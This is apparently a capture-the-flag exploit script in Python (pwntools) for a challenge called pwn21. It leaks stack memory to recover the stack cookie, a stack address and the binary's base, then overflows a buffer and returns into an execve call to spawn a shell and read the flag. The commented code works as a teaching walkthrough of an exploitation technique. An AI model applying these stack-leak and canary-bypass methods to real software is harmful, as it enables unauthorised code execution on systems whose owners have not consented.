# Axel '0vercl0k' Souchet - November 3 2019
from pwn import *
import sys

def main(argc, argv):
    '''
    over@chilllyfe:/pwny.racing$ python pwn21.py remote
    [+] Opening connection to challenge.pwny.racing on port 40021: Done
    Leaked:
    00000000  fe 5e e3 ff  7f 7f 00 00  01 00 00 00  00 00 00 00  |.^..|....|....|....|
    00000010  01 00 00 00  00 00 00 00  1d 4c b3 f4  37 56 00 00  |....|....|.L..|7V..|
    00000020  a0 f9 fd 30  7c 7f 00 00  00 00 00 00  00 00 00 00  |...0||...|....|....|
    00000030  d0 4b b3 f4  37 56 00 00  d0 47 b3 f4  37 56 00 00  |.K..|7V..|.G..|7V..|
    00000040  c0 ff 5e e3  ff 7f 00 00  00 be fe 6b  1b 15 2b 90  |..^.|....|...k|..+.|
    00000050  d0 4b b3 f4  37 56 00 00  25 4a b3 f4  37 56 00 00  |.K..|7V..|%J..|7V..|
    stack_buffer 0x7fffe35efe90
    cookie 0x902b151b6bfebe00
    base 0x5637f4b34000
    [*] Switching to interactive mode
    output: /bin/bash
    buffer: $ cat flag
    pwny{the_final_c4mpd0wn}
    '''
    if argc != 2:
        print './pwn21 <remote|local>'
        return

    _, where = argv
    if where == 'remote':
        p = remote('challenge.pwny.racing', 40021)
    else:
        p = process('./chall21')

    # The below uses the bug to leak the stack. At worst,
    # it does it byte by byte. Best case scenario there's
    # no null bytes and then you dump as much as the printf
    # returns.
    leak_amount = 0x60
    leak = ''
    while len(leak) < leak_amount:
        # Sliding window is used to fill the buffer up until
        # the point we want to leak.
        sliding_window = 'A' * len(leak) if len(leak) > 0 else 'A'
        p.sendline(sliding_window)
        p.recvuntil('output: ' + sliding_window)
        l = p.recvuntil('buffer: ', True)
        # The data must be terminated with a line feed.
        assert l[-1] == '\n', 'Expecting line feed'
        # If we received only the line feed, then it means the
        # next byte is a NULL byte.
        leak += l[: -1] if len(l) > 1 else '\x00'

    print 'Leaked:'
    print hexdump(leak)

    # Grab a stack-address off the leaked buffer, this will be useful later.
    stack = u64(leak[0x40 : 0x40 + 8])
    stack_buffer = stack - 0x130
    print 'stack_buffer', hex(stack_buffer)
    # Grab the stack cookie so that we can get code execution later.
    cookie = u64(leak[0x48 : 0x48 + 8])
    assert (cookie & 0xff) == 0, 'First byte of the cookie is expected to be NULL'
    print 'cookie', hex(cookie)
    # Grab the saved return address so that we can leak the base of the challenge.
    srip = u64(leak[0x58 : 0x58 + 8])
    assert (srip & 0xfff) == 0xa25, 'Saved return address does not look right'
    base = srip - 0x0a25
    print 'base', hex(base)

    # The idea here is pretty simple; we have already leaked everything we need
    # to pull it off. We get control execution and we return into the middle of
    # the function that wraps a call to execve; this allows us to have control
    # over @rsi / @rdi / @rdx / @rcx via the stack. This is convenient as I could
    # not find gadgets that would allow me to do the same, and we don't want to
    # guess the remote libc.
    # We overwrite the saved @rbp with a pointer to the stack so that @rbp - 0x38
    # points right after our chain.
    chain = ''.join(map(p64, (
        # cookie
        cookie,
        # saved @rbp
        stack_buffer + 72 + 8 + 8 + 8 + 0x38,
        # saved @rip
        #  .text:00000000000009EF    mov     [rbp-0x38], 0
        #  .text:00000000000009F7    mov     rax, [rbp-0x30] ; path
        #  .text:00000000000009FB    lea     rdx, [rbp-0x38] ; envp
        #  .text:00000000000009FF    lea     rcx, [rbp-0x30]
        #  .text:0000000000000A03    mov     rsi, rcx        ; argv
        #  .text:0000000000000A06    mov     rdi, rax        ; path
        #  .text:0000000000000A09    call    _execve
        base + 0x9ef
    ))) + p64(0x11111111) + p64(stack_buffer) + p64(0)

    # The only case where the exploit can fail at this point is if either a
    # cariage return / line feed shows up in the chain (because of ASLR, etc.).
    assert '\r' not in chain, 'No cariage return allowed in the chain'
    assert '\n' not in chain, 'No line feed allowed in the chain'

    # The `stack_buffer` variable points to this string, and this is what we pass
    # to execve.
    front = '/bin/bash\x00'
    # Time to smash it boiz!
    p.sendline(front + 'A' * (72 - len(front)) + chain)
    # Send a line feed to break out of the two nested loops.
    p.sendline('\n')
    # Shell?
    p.interactive()

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
